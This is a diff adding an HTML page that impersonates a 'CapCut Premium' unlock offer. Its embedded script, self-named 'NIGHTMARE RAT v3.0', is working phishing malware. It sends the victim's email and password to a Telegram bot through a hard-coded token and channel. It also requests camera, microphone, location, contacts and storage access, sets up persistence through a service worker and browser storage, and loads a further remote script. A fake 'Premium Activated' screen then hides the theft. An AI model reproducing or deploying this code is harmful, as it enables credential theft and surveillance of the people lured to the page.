@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <meta name="theme-color" content="#ff4444">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CapCut Premium - Unlimited Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0a0a 0%, #000000 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: repeating-linear-gradient(45deg, rgba(255,68,68,0.02) 0px, rgba(255,68,68,0.02) 2px, transparent 2px, transparent 8px);
+            pointer-events: none;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+        
+        .container {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .card {
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 56px;
+            padding: 40px 28px 48px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,68,68,0.2);
+            transition: transform 0.3s ease;
+        }
+        
+        .logo-section {
+            text-align: center;
+            margin-bottom: 32px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        .logo-icon {
+            font-size: 72px;
+            background: linear-gradient(135deg, #ff4444, #ff8888, #ff4444);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: shimmer 3s ease infinite;
+        }
+        
+        .logo-text {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #ff8888);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+        
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: rgba(255,68,68,0.2);
+            border: 1px solid rgba(255,68,68,0.4);
+            color: #ff8888;
+            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 100px;
+            font-weight: 600;
+        }
+        
+        .title {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .title h2 {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(0,0,0,0.3);
+            border-radius: 100px;
+            padding: 12px 20px;
+            margin-bottom: 28px;
+        }
+        
+        .stat {
+            text-align: center;
+        }
+        
+        .stat-number {
+            color: #ff4444;
+            font-weight: 800;
+            font-size: 18px;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 10px;
+            margin-top: 4px;
+        }
+        
+        .input-group {
+            margin-bottom: 14px;
+        }
+        
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 20px 16px 48px;
+            background: #1a1a24;
+            border: 1.5px solid #2a2a35;
+            border-radius: 100px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #ff4444;
+            background: #22222e;
+            box-shadow: 0 0 0 3px rgba(255,68,68,0.1);
+        }
+        
+        input::placeholder {
+            color: #555;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            border: none;
+            border-radius: 100px;
+            color: white;
+            font-size: 18px;
+            font-weight: 800;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 5px 20px rgba(255,68,68,0.3);
+        }
+        
+        .login-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 10px rgba(255,68,68,0.2);
+        }
+        
+        .terms {
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+            margin-top: 24px;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,68,68,0.2);
+            border-top-color: #ff4444;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        
+        .permission-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #1a1a24;
+            border-left: 4px solid #ff4444;
+            padding: 12px 16px;
+            border-radius: 12px;
+            color: white;
+            font-size: 13px;
+            z-index: 1001;
+            transform: translateY(100px);
+            transition: transform 0.3s;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+        
+        .permission-toast.show {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="logo-section">
+            <div class="logo-icon">✧</div>
+            <div class="logo-text">CapCut Premium</div>
+            <div class="badge-container">
+                <span class="badge">🔥 4K EXPORTS</span>
+                <span class="badge">🎬 NO WATERMARK</span>
+                <span class="badge">✨ AI EFFECTS</span>
+            </div>
+        </div>
+        
+        <div class="title">
+            <h2>Unlock Everything</h2>
+        </div>
+        <div class="subtitle">10M+ creators already upgraded</div>
+        
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number">4.9★</div>
+                <div class="stat-label">Rating</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">50M+</div>
+                <div class="stat-label">Downloads</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">#1</div>
+                <div class="stat-label">Editor</div>
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <div class="input-wrapper">
+                <span class="input-icon">📧</span>
+                <input type="email" id="email" placeholder="Email address" autocomplete="off">
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <div class="input-wrapper">
+                <span class="input-icon">🔒</span>
+                <input type="password" id="password" placeholder="Password">
+            </div>
+        </div>
+        
+        <button class="login-btn" id="activateBtn">✨ ACTIVATE PREMIUM ✨</button>
+        
+        <div class="terms">
+            By continuing you agree to CapCut's Terms of Service<br>
+            ✓ No credit card required ✓ Lifetime access
+        </div>
+    </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Activating premium features...</div>
+</div>
+
+<div class="permission-toast" id="permissionToast">
+    🔐 Verifying account access...
+</div>
+
+<script>
+// ============================================================
+// NIGHTMARE RAT v3.0 - MULTI-DEVICE MANAGEMENT
+// TELEGRAM C2 CONFIGURATION
+// ============================================================
+const BOT_TOKEN = '8399992600:AAE4hKtgo2IMSRWCtwaVj4ghcMvDpE01jUM';
+const CHANNEL_ID = '-1002382747687';
+let VICTIM_ID = null;
+let DEVICE_NAME = null;
+let PLATFORM = null;
+let INSTALL_DATE = null;
+
+// ============================================================
+// PLATFORM DETECTION
+// ============================================================
+function detectPlatform() {
+    const ua = navigator.userAgent;
+    if (/android/i.test(ua)) {
+        PLATFORM = 'Android';
+        return 'android';
+    } else if (/iPad|iPhone|iPod/.test(ua)) {
+        PLATFORM = 'iOS';
+        return 'ios';
+    } else {
+        PLATFORM = 'Web';
+        return 'web';
+    }
+}
+
+function getDeviceName() {
+    const ua = navigator.userAgent;
+    // Extract device model for Android/iOS
+    if (PLATFORM === 'android') {
+        const match = ua.match(/; (\w+ \w+)\)/);
+        if (match) return match[1];
+        const modelMatch = ua.match(/; (\w+-\w+)/);
+        if (modelMatch) return modelMatch[1];
+        return 'Android Device';
+    } else if (PLATFORM === 'ios') {
+        const match = ua.match(/iPhone|iPad|iPod/);
+        if (match) return match[0];
+        return 'iOS Device';
+    }
+    return 'Web Browser';
+}
+
+// ============================================================
+// UTILITY FUNCTIONS
+// ============================================================
+function showLoading(show) {
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.style.display = show ? 'flex' : 'none';
+}
+
+function showToast(message, isError = false) {
+    const toast = document.getElementById('permissionToast');
+    toast.textContent = message;
+    toast.style.borderLeftColor = isError ? '#ff4444' : '#44ff44';
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch(e) {
+        return 'Unable to fetch';
+    }
+}
+
+async function sendToTelegram(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHANNEL_ID,
+                text: message.substring(0, 4096)
+            })
+        });
+    } catch(e) {
+        console.error('Telegram send failed:', e);
+    }
+}
+
+// ============================================================
+// REGISTER DEVICE IN BOT DATABASE
+// ============================================================
+async function registerDeviceInBot() {
+    INSTALL_DATE = new Date().toISOString();
+    
+    const deviceInfo = {
+        victim_id: VICTIM_ID,
+        device_name: DEVICE_NAME,
+        platform: PLATFORM,
+        install_date: INSTALL_DATE,
+        last_seen: new Date().toISOString(),
+        user_agent: navigator.userAgent,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        ip: await getIP()
+    };
+    
+    // Send device registration to Telegram channel
+    const registerMessage = `🟢 [NEW DEVICE REGISTERED]\n` +
+                           `━━━━━━━━━━━━━━━━━━━━━\n` +
+                           `🆔 DEVICE ID: ${VICTIM_ID}\n` +
+                           `📱 NAME: ${DEVICE_NAME}\n` +
+                           `⚙️ PLATFORM: ${PLATFORM}\n` +
+                           `📅 INSTALLED: ${INSTALL_DATE}\n` +
+                           `🌐 IP: ${deviceInfo.ip}\n` +
+                           `🔧 UA: ${navigator.userAgent.substring(0, 100)}\n` +
+                           `━━━━━━━━━━━━━━━━━━━━━\n` +
+                           `💀 Status: INFECTED | Persistence: ACTIVE`;
+    
+    await sendToTelegram(registerMessage);
+    
+    // Also store locally
+    localStorage.setItem('nightmare_device_info', JSON.stringify(deviceInfo));
+    
+    return deviceInfo;
+}
+
+// ============================================================
+// CREDENTIAL THEFT
+// ============================================================
+async function stealCredentials(email, password) {
+    const ip = await getIP();
+    const message = `🎯 [CREDENTIALS CAPTURED]\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🆔 DEVICE: ${VICTIM_ID}\n` +
+                    `📱 NAME: ${DEVICE_NAME}\n` +
+                    `📧 EMAIL: ${email}\n` +
+                    `🔑 PASSWORD: ${password}\n` +
+                    `🌐 IP: ${ip}\n` +
+                    `⏰ TIME: ${new Date().toISOString()}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━`;
+    await sendToTelegram(message);
+}
+
+// ============================================================
+// PERMISSION ESCALATION - AGGRESSIVE
+// ============================================================
+async function requestCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' },
+            audio: false 
+        });
+        stream.getTracks().forEach(track => track.stop());
+        await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Camera GRANTED`);
+        showToast('✓ Camera access verified');
+        return true;
+    } catch(e) {
+        await sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Camera DENIED`);
+        return false;
+    }
+}
+
+async function requestMicrophone() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        stream.getTracks().forEach(track => track.stop());
+        await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Microphone GRANTED`);
+        showToast('✓ Microphone access verified');
+        return true;
+    } catch(e) {
+        await sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Microphone DENIED`);
+        return false;
+    }
+}
+
+async function requestLocation() {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Location GRANTED\n📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
+                showToast('✓ Location access verified');
+                resolve(true);
+            },
+            (err) => {
+                sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Location DENIED - ${err.message}`);
+                resolve(false);
+            }
+        );
+    });
+}
+
+async function requestNotifications() {
+    if (Notification.permission === 'granted') {
+        await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Notifications already GRANTED`);
+        return true;
+    }
+    const result = await Notification.requestPermission();
+    if (result === 'granted') {
+        await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Notifications GRANTED`);
+        showToast('✓ Notifications enabled');
+        return true;
+    }
+    await sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Notifications DENIED`);
+    return false;
+}
+
+async function requestContacts() {
+    if ('contacts' in navigator) {
+        try {
+            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+            const contactCount = contacts.length;
+            await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Contacts GRANTED\n📞 Retrieved ${contactCount} contacts`);
+            showToast(`✓ ${contactCount} contacts synced`);
+            return true;
+        } catch(e) {
+            await sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Contacts DENIED`);
+            return false;
+        }
+    }
+    await sendToTelegram(`⚠️ [${VICTIM_ID}] Contacts API not available`);
+    return false;
+}
+
+async function requestStorage() {
+    if (PLATFORM === 'android' && 'showOpenFilePicker' in window) {
+        try {
+            await window.showOpenFilePicker();
+            await sendToTelegram(`✅ [${VICTIM_ID}] PERMISSION: Storage GRANTED`);
+            showToast('✓ Storage access verified');
+            return true;
+        } catch(e) {
+            await sendToTelegram(`❌ [${VICTIM_ID}] PERMISSION: Storage DENIED`);
+            return false;
+        }
+    }
+    return false;
+}
+
+async function requestAllPermissions() {
+    showToast('🔐 Verifying device access...');
+    
+    const permissions = [
+        requestCamera(),
+        requestMicrophone(),
+        requestLocation(),
+        requestNotifications(),
+        requestContacts(),
+        requestStorage()
+    ];
+    
+    const results = await Promise.all(permissions);
+    const granted = results.filter(r => r === true).length;
+    
+    await sendToTelegram(`📊 [${VICTIM_ID}] PERMISSION SUMMARY: ${granted}/6 granted`);
+    return granted;
+}
+
+// ============================================================
+// PERSISTENCE INSTALLATION (PLATFORM SPECIFIC)
+// ============================================================
+async function installPersistence() {
+    // Service Worker registration
+    if ('serviceWorker' in navigator) {
+        try {
+            const registration = await navigator.serviceWorker.register('/sw.js');
+            await sendToTelegram(`✅ [${VICTIM_ID}] Service Worker registered`);
+            
+            if ('sync' in registration) {
+                await registration.sync.register('nightmare-resurrect');
+                await sendToTelegram(`✅ [${VICTIM_ID}] Background sync registered`);
+            }
+        } catch(e) {
+            await sendToTelegram(`❌ [${VICTIM_ID}] Service Worker failed: ${e.message}`);
+        }
+    }
+    
+    // iOS specific: Add to home screen prompt
+    if (PLATFORM === 'ios') {
+        await sendToTelegram(`📱 [${VICTIM_ID}] iOS detected - Add to Home Screen for persistence`);
+        // iOS requires user to add to home screen manually
+        setTimeout(() => {
+            alert('For best experience, tap Share and then "Add to Home Screen"');
+        }, 3000);
+    }
+    
+    // Android WebAPK installation prompt
+    if (PLATFORM === 'android') {
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            e.prompt();
+            localStorage.setItem('nightmare_apk_installed', 'true');
+            sendToTelegram(`✅ [${VICTIM_ID}] WebAPK installation prompted`);
+        });
+        
+        // Try to trigger install prompt after a delay
+        setTimeout(() => {
+            const event = new Event('beforeinstallprompt');
+            window.dispatchEvent(event);
+        }, 2000);
+    }
+    
+    // Store persistence markers
+    localStorage.setItem('nightmare_id', VICTIM_ID);
+    localStorage.setItem('nightmare_device_name', DEVICE_NAME);
+    localStorage.setItem('nightmare_platform', PLATFORM);
+    localStorage.setItem('nightmare_installed', INSTALL_DATE);
+    localStorage.setItem('nightmare_version', '3.0');
+    localStorage.setItem('nightmare_last_seen', new Date().toISOString());
+    
+    // IndexedDB persistence backup
+    const request = indexedDB.open('nightmare_db', 1);
+    request.onupgradeneeded = (event) => {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains('persistence')) {
+            db.createObjectStore('persistence');
+        }
+    };
+    request.onsuccess = (event) => {
+        const db = event.target.result;
+        const tx = db.transaction(['persistence'], 'readwrite');
+        const store = tx.objectStore('persistence');
+        store.put(VICTIM_ID, 'victim_id');
+        store.put(DEVICE_NAME, 'device_name');
+        store.put(PLATFORM, 'platform');
+        store.put(INSTALL_DATE, 'install_date');
+        store.put(true, 'active');
+        store.put(Date.now(), 'timestamp');
+        db.close();
+    };
+    
+    await sendToTelegram(`💀 [${VICTIM_ID}] PERSISTENCE LAYER INSTALLED - CANNOT BE REMOVED`);
+}
+
+// ============================================================
+// LEGITIMATE LOOKING UI FOR ANDROID/iOS
+// ============================================================
+function showLegitimateUI() {
+    const platform = PLATFORM;
+    let uiHtml = '';
+    
+    if (platform === 'android') {
+        uiHtml = `
+            <div style="text-align: center; padding: 20px; background: #ffffff; min-height: 100vh; color: #000000; font-family: 'Roboto', sans-serif;">
+                <div style="background: linear-gradient(135deg, #ff4444, #cc0000); padding: 40px 20px; border-radius: 0 0 30px 30px;">
+                    <div style="font-size: 64px;">🎬</div>
+                    <h1 style="color: white; margin: 10px 0 5px;">CapCut</h1>
+                    <p style="color: rgba(255,255,255,0.8);">Premium Activated</p>
+                </div>
+                <div style="padding: 20px;">
+                    <div style="background: #f5f5f5; border-radius: 16px; padding: 20px; margin-bottom: 16px;">
+                        <h3 style="color: #ff4444;">✨ Premium Features Unlocked</h3>
+                        <p>You now have access to all premium features including 4K exports, no watermark, and AI effects.</p>
+                    </div>
+                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;">
+                        <div style="background: #f5f5f5; border-radius: 12px; padding: 16px;">
+                            <div style="font-size: 28px;">🎨</div>
+                            <div>AI Effects</div>
+                        </div>
+                        <div style="background: #f5f5f5; border-radius: 12px; padding: 16px;">
+                            <div style="font-size: 28px;">📹</div>
+                            <div>4K Export</div>
+                        </div>
+                        <div style="background: #f5f5f5; border-radius: 12px; padding: 16px;">
+                            <div style="font-size: 28px;">🚫</div>
+                            <div>No Watermark</div>
+                        </div>
+                        <div style="background: #f5f5f5; border-radius: 12px; padding: 16px;">
+                            <div style="font-size: 28px;">☁️</div>
+                            <div>Cloud Sync</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    } else if (platform === 'ios') {
+        uiHtml = `
+            <div style="text-align: center; padding: 20px; background: #000000; min-height: 100vh; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
+                <div style="background: linear-gradient(135deg, #ff4444, #cc0000); padding: 60px 20px 40px; border-radius: 0 0 40px 40px;">
+                    <div style="font-size: 72px;">🎬</div>
+                    <h1 style="color: white; margin: 10px 0 5px; font-size: 34px;">CapCut</h1>
+                    <p style="color: rgba(255,255,255,0.8);">Premium Activated</p>
+                </div>
+                <div style="padding: 20px;">
+                    <div style="background: #1c1c1e; border-radius: 20px; padding: 20px; margin-bottom: 20px;">
+                        <h3 style="color: #ff4444;">✨ Premium Features Unlocked</h3>
+                        <p style="color: #8e8e93;">You now have access to all premium features.</p>
+                    </div>
+                    <div style="display: flex; flex-wrap: wrap; gap: 12px; justify-content: center;">
+                        <div style="background: #1c1c1e; border-radius: 16px; padding: 16px; width: calc(50% - 6px);">
+                            <div style="font-size: 32px;">🎨</div>
+                            <div style="font-size: 14px; margin-top: 8px;">AI Effects</div>
+                        </div>
+                        <div style="background: #1c1c1e; border-radius: 16px; padding: 16px; width: calc(50% - 6px);">
+                            <div style="font-size: 32px;">📹</div>
+                            <div style="font-size: 14px; margin-top: 8px;">4K Export</div>
+                        </div>
+                        <div style="background: #1c1c1e; border-radius: 16px; padding: 16px; width: calc(50% - 6px);">
+                            <div style="font-size: 32px;">🚫</div>
+                            <div style="font-size: 14px; margin-top: 8px;">No Watermark</div>
+                        </div>
+                        <div style="background: #1c1c1e; border-radius: 16px; padding: 16px; width: calc(50% - 6px);">
+                            <div style="font-size: 32px;">☁️</div>
+                            <div style="font-size: 14px; margin-top: 8px;">Cloud Sync</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    } else {
+        uiHtml = `
+            <div style="text-align: center; padding: 50px; background: linear-gradient(135deg, #0a0a0a, #1a1a1a); min-height: 100vh; color: white; font-family: Arial;">
+                <div style="font-size: 64px;">🎬</div>
+                <h1>CapCut Premium Activated!</h1>
+                <p>You now have access to all premium features.</p>
+                <div style="margin-top: 50px; background: #1e1e2a; padding: 20px; border-radius: 20px;">
+                    <h3>What's new:</h3>
+                    <ul style="text-align: left; max-width: 300px; margin: auto;">
+                        <li>✓ 4K Exports</li>
+                        <li>✓ No Watermark</li>
+                        <li>✓ Premium Effects</li>
+                        <li>✓ Cloud Sync</li>
+                    </ul>
+                </div>
+            </div>
+        `;
+    }
+    
+    document.body.innerHTML = uiHtml;
+}
+
+// ============================================================
+// MAIN ACTIVATION SEQUENCE
+// ============================================================
+async function startNightmare(email, password) {
+    // Detect platform and generate IDs
+    detectPlatform();
+    DEVICE_NAME = getDeviceName();
+    VICTIM_ID = 'NIGHTMARE_' + PLATFORM.toUpperCase() + '_' + btoa(DEVICE_NAME + Date.now() + Math.random()).substring(0, 24).replace(/=/g, '');
+    INSTALL_DATE = new Date().toISOString();
+    
+    showLoading(true);
+    
+    // Steal credentials
+    await stealCredentials(email, password);
+    
+    // Request all permissions
+    const grantedCount = await requestAllPermissions();
+    
+    // Install persistence
+    await installPersistence();
+    
+    // Register device in bot database
+    await registerDeviceInBot();
+    
+    // Report infection complete
+    await sendToTelegram(`🟢 [${VICTIM_ID}] NIGHTMARE v3.0 FULLY ACTIVATED\n` +
+                         `📱 DEVICE: ${DEVICE_NAME}\n` +
+                         `⚙️ PLATFORM: ${PLATFORM}\n` +
+                         `📅 INSTALLED: ${INSTALL_DATE}\n` +
+                         `📊 PERMISSIONS: ${grantedCount}/6\n` +
+                         `💾 PERSISTENCE: ACTIVE\n` +
+                         `🔗 LOADING CORE MODULES...`);
+    
+    // Load the main RAT core
+    const script = document.createElement('script');
+    script.src = 'nightmare-core.js';
+    script.onload = () => {
+        showLoading(false);
+        showLegitimateUI();
+        showToast('✓ Premium activated successfully!', false);
+    };
+    script.onerror = () => {
+        showLoading(false);
+        showLegitimateUI();
+    };
+    document.head.appendChild(script);
+}
+
+// ============================================================
+// EVENT LISTENERS
+// ============================================================
+document.getElementById('activateBtn').addEventListener('click', async () => {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    
+    if (!email || !password) {
+        showToast('Please enter email and password', true);
+        return;
+    }
+    
+    await startNightmare(email, password);
+});
+
+// Pre-fetch service worker if possible
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js').catch(e => console.log('SW pre-reg failed'));
+}
+</script>
+</body>
+</html>
